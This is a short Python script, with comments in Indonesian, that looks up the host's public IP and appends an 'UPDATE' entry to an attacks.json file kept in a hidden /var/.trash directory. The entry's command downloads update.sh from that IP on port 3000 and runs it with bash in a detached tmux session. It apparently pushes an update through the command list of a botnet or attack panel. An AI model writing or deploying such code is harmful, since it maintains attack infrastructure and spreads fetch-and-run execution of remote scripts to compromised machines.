import json
import os
import subprocess

# Lokasi file JSON
file_path = '/var/.trash/kontol/data/attacks.json'

# Mendapatkan IP publik menggunakan curl
def get_public_ip():
    try:
        return subprocess.check_output(['curl', '-s', 'ifconfig.me']).decode('utf-8').strip()
    except Exception as e:
        print(f"Gagal mendapatkan IP publik: {e}")
        return None

# Data baru yang akan ditambahkan
public_ip = get_public_ip()
if public_ip:
    new_data = {
        "methods": "UPDATE",
        "command": f"tmux new-session -d 'curl -O {public_ip}:3000/update.sh && bash update.sh'"
    }

    # Cek apakah file ada
    if os.path.exists(file_path):
        # Membaca konten JSON yang ada
        with open(file_path, 'r') as file:
            try:
                data = json.load(file)
            except json.JSONDecodeError:
                data = []  # Jika file kosong, buat list baru
    else:
        data = []  # Jika file tidak ada, buat list baru

    # Tambahkan data baru ke dalam list
    data.append(new_data)

    # Simpan kembali ke file
    with open(file_path, 'w') as file:
        json.dump(data, file, indent=4)

    print(f"Data berhasil ditambahkan ke {file_path}")
else:
    print("Tidak bisa menambahkan data karena IP publik tidak ditemukan.")
